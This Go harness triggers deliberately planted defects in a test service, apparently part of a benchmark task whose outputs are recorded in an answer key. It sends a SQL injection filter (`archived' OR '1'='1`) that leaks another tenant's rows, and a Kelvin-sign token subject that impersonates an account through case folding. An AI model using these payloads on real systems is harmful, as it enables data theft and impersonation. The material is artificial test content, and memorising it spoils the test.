// Command triggers exercises the planted defects of this case against whichever module it is run
// from. `sh testdata/triggers/run.sh <variant>` stages the variant and runs this harness, so the
// output here is what KEY.json records as trigger.actual and trigger.expected.
package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"time"

	"example.com/insight"
)

const secret = "trigger-secret-0123456789"

// injection is the status filter a caller sends to the export when it wants the statement's own
// quoting to end early.
const injection = `archived' OR '1'='1`

func main() {
	service, err := insight.Open(insight.Options{TokenSecret: secret, Seed: true})
	if err != nil {
		fmt.Println("open:", err)
		os.Exit(1)
	}
	service.SetClock(func() time.Time { return time.Date(2024, 5, 1, 12, 0, 0, 0, time.UTC) })
	handler := service.Handler()

	exporter := service.Issue("amara", "acme", []string{"reports:export", "reports:read"}, time.Hour)

	// D1: the export route joins the status filter into the statement text.
	rec := get(handler, exporter, "/api/reports/usage/export.csv?status="+url.QueryEscape(injection))
	tenants, rows := bornBy(rec.Body.String())
	fmt.Printf("D1 GET /api/reports/usage/export.csv?status=archived' OR '1'='1 -> status=%d rows=%d tenants=%v\n",
		rec.Code, rows, tenants)

	// The sibling route that binds the same filter refuses the value before a statement runs.
	rec = get(handler, exporter, "/api/events?status="+url.QueryEscape(injection))
	fmt.Printf("ok GET /api/events?status=archived' OR '1'='1 -> status=%d body=%q\n", rec.Code, firstLine(rec.Body.String()))

	// D2: a token that asserts a subject differing from a known account only by case folding.
	kelvin := "\u212Aelvin" // KELVIN SIGN + "elvin"
	rec = get(handler, service.Issue(kelvin, "acme", []string{"reports:read"}, time.Hour), "/api/reports/usage")
	fmt.Printf("D2 GET /api/reports/usage with token subject %q -> %s\n", kelvin, outcome(rec))

	// The account itself, for contrast.
	rec = get(handler, service.Issue("kelvin", "acme", []string{"reports:read"}, time.Hour), "/api/reports/usage")
	fmt.Printf("ok GET /api/reports/usage with token subject \"kelvin\" -> %s\n", outcome(rec))
}

func get(handler http.Handler, token, path string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodGet, path, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	return rec
}

// bornBy reads an exported CSV and returns the tenants it carries and its row count, so the defect
// shows as rows of a second tenant rather than as a longer text.
func bornBy(body string) ([]string, int) {
	lines := strings.Split(strings.TrimSpace(body), "\n")
	seen := map[string]bool{}
	var tenants []string
	rows := 0
	for i, line := range lines {
		if i == 0 || strings.TrimSpace(line) == "" {
			continue
		}
		rows++
		cells := strings.Split(line, ",")
		if len(cells) > 1 && !seen[cells[1]] {
			seen[cells[1]] = true
			tenants = append(tenants, cells[1])
		}
	}
	return tenants, rows
}

// outcome renders a report response as the fact the defect turns on: the tenant and row count the
// service answered with, or the error it refused with.
func outcome(rec *httptest.ResponseRecorder) string {
	var body struct {
		Tenant string           `json:"tenant"`
		Count  int              `json:"count"`
		Error  string           `json:"error"`
		Rows   []map[string]any `json:"rows"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		return fmt.Sprintf("status=%d body=%q", rec.Code, firstLine(rec.Body.String()))
	}
	if body.Error != "" {
		return fmt.Sprintf("status=%d error=%q", rec.Code, body.Error)
	}
	account := ""
	if len(body.Rows) > 0 {
		if value, ok := body.Rows[0]["account"].(string); ok {
			account = value
		}
	}
	return fmt.Sprintf("status=%d tenant=%q account=%q count=%d", rec.Code, body.Tenant, account, body.Count)
}

// firstLine renders a JSON body as one line so the output stays readable.
func firstLine(body string) string {
	body = strings.TrimSpace(body)
	if cut := strings.IndexByte(body, '\n'); cut >= 0 {
		body = body[:cut]
	}
	if len(body) > 160 {
		return body[:160] + "..."
	}
	return body
}
